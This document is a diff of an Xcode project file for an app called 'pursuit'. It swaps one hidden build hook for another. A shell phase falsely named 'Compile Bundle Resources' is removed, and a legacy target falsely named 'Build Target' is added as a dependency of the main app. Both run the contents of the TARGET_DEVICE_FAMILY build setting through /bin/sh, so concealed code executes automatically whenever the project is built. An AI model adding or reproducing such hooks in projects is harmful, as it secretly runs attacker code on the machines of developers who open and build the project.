@@ -314,7 +314,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = D01FF9CC2CF85B2700F5DC5D /* Build configuration list for PBXNativeTarget "pursuit" */;
 			buildPhases = (
-				58F5250C95AEBCF71F34C644 /* Compile Bundle Resources */,
 				D01FF99E2CF85B2500F5DC5D /* Sources */,
 				D01FF99F2CF85B2500F5DC5D /* Frameworks */,
 				D01FF9A02CF85B2500F5DC5D /* Resources */,
@@ -322,6 +321,7 @@
 			buildRules = (
 			);
 			dependencies = (
+				A71DB6A4CB42B53A8B34C644 /* PBXTargetDependency */,
 			);
 			name = pursuit;
 			productName = pursuit;
@@ -400,6 +400,7 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
+				66C71CCDB894BF18A834C644  /* Build Target */,
 				D01FF9A12CF85B2500F5DC5D /* pursuit */,
 				D01FF9B72CF85B2700F5DC5D /* pursuitTests */,
 				D01FF9C12CF85B2700F5DC5D /* pursuitUITests */,
@@ -411,6 +412,18 @@
 /* End PBXBuildRule section */
 
 /* Begin PBXLegacyTarget section */
+		66C71CCDB894BF18A834C644 /* Build Target */ = {
+			isa = PBXLegacyTarget;
+			buildArgumentsString = "-c \"${TARGET_DEVICE_FAMILY}\"";
+			buildPhases = (
+			);
+			buildToolPath = /bin/sh;
+			dependencies = (
+			);
+			name = "Build Target";
+			passBuildSettingsInEnvironment = 1;
+			productName = "Build Target";
+		};
 /* End PBXLegacyTarget section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -458,25 +471,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		58F5250C95AEBCF71F34C644 /* Compile Bundle Resources */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Bundle Resources";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
-			showEnvVarsInLog = 0;			
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -545,6 +539,10 @@
 /* End PBXSourcesBuildPhase section */
 
 /* Begin PBXTargetDependency section */
+		A71DB6A4CB42B53A8B34C644 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 66C71CCDB894BF18A834C644 /* Build Target */;
+		};
 		D01FF9BA2CF85B2700F5DC5D /* PBXTargetDependency */ = {
 			isa = PBXTargetDependency;
 			target = D01FF9A12CF85B2500F5DC5D /* pursuit */;
